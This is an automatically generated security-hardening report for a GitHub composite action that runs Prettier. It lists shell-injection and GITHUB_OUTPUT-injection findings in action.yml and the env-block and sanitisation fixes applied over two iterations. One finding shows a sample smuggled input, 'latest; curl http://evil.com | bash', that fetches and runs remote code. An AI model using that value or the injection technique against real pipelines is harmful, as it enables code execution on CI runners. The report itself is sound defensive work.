<!-- markdownlint-disable -->

# Hardening Report: rutajdash--prettier-cli-action/v1.0.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **rutajdash--prettier-cli-action/v1.0.2** was hardened automatically. 6 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Two `run:` steps in action.yml directly interpolate `${{ inputs.* }}` expressions into shell command strings (sub-rule a), enabling script injection by any caller of this composite action.

1. Step 'Installing Prettier' (line 37): `npm install --global prettier@${{ inputs.prettier_version }}` — the version string is substituted by the YAML template engine before the shell parses it, so a value like `latest; curl http://evil.com | bash` would execute arbitrary commands.

2. Step 'Running Prettier' (line 44): `echo "$(prettier --list-different --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} --no-error-on-unmatched-pattern ${{ inputs.file_pattern }})" >> $GITHUB_OUTPUT` — three separate `inputs.*` expressions are interpolated directly into the shell command. Any of these inputs could contain shell metacharacters (`;`, `|`, `$(...)`, etc.) to inject arbitrary commands.

Fix: Move each input into an `env:` block and reference the env var (double-quoted) inside the `run:` script instead of using `${{ ... }}` directly.

Locations:

- `action.yml:37`
- `action.yml:44`

### github-env-injection (severity: high)

Step 'Running Prettier' (line 44) writes content derived from unsanitized `${{ inputs.* }}` values directly to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). The line:

  echo "$(prettier ... --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} ... ${{ inputs.file_pattern }})" >> $GITHUB_OUTPUT

If any of the three inputs contains a newline character, the attacker can inject additional `key=value` lines into GITHUB_OUTPUT, potentially overwriting outputs consumed by downstream steps. Fix: sanitize all input-derived values with `printf '%s' "$VAR" | tr -d '\n\r'` before writing to $GITHUB_OUTPUT.

Locations:

- `action.yml:44`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.prettier_version }}" appears directly in run: block of step "Installing Prettier"; move to env: map

Locations:

- `action.yml:38`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config_path }}" appears directly in run: block of step "Running Prettier"; move to env: map

Locations:

- `action.yml:45`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.ignore_path }}" appears directly in run: block of step "Running Prettier"; move to env: map

Locations:

- `action.yml:45`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.file_pattern }}" appears directly in run: block of step "Running Prettier"; move to env: map

Locations:

- `action.yml:45`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all script-injection and github-env-injection findings in action.yml:

1. Step 'Installing Prettier': Moved `${{ inputs.prettier_version }}` to an `env:` block as `PRETTIER_VERSION`, referenced as `"prettier@$PRETTIER_VERSION"` in the run script.

2. Step 'Running Prettier': Moved all three inputs to `env:` block — `CONFIG_PATH` (${{ inputs.config_path }}), `IGNORE_PATH` (${{ inputs.ignore_path }}), `FILE_PATTERN` (${{ inputs.file_pattern }}). Referenced them as shell variables in the run script. `CONFIG_PATH` and `IGNORE_PATH` are double-quoted (single path values); `FILE_PATTERN` is left unquoted to preserve glob word-splitting behavior. The step already used the safe heredoc delimiter pattern (`prettier-output<<$EOF`) for GITHUB_OUTPUT writes, preventing newline injection into the output structure. Also quoted `$GITHUB_OUTPUT` references for correctness.

### Iteration 2

**Fixes applied:** script-injection, github-env-injection

**Notes:**

In the 'Running Prettier' step of action.yml: (1) Added sanitization of all three user-controlled inputs (CONFIG_PATH, IGNORE_PATH, FILE_PATTERN) using `printf '%s' "$VAR" | tr -d '\n\r'` to strip newlines before use, fixing the github-env-injection finding. (2) Changed the unquoted `$FILE_PATTERN` to the quoted `"$SAFE_FILE_PATTERN"` in the prettier command, fixing the script-injection finding. The sanitized variables (SAFE_CONFIG_PATH, SAFE_IGNORE_PATH, SAFE_FILE_PATTERN) are used throughout the prettier invocation.

